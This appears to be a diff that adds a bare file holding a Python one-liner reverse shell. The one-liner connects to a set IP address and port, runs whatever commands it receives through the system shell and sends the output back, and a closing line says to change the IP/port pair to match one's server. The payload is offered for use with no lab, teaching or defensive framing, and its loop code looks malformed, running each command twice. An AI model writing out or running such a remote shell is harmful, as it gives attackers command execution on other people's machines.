@@ -1,0 +1,3 @@
+python -c "import socket, subprocess; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('192.168.1.77', 9119)); exec('while True: c=s.recv(1024).decode(); s.send(subprocess.run(c, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout + subprocess.run(c, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stderr) if c != \"exit\" else s.close()')"
+
+Change pair ip-port like it on server
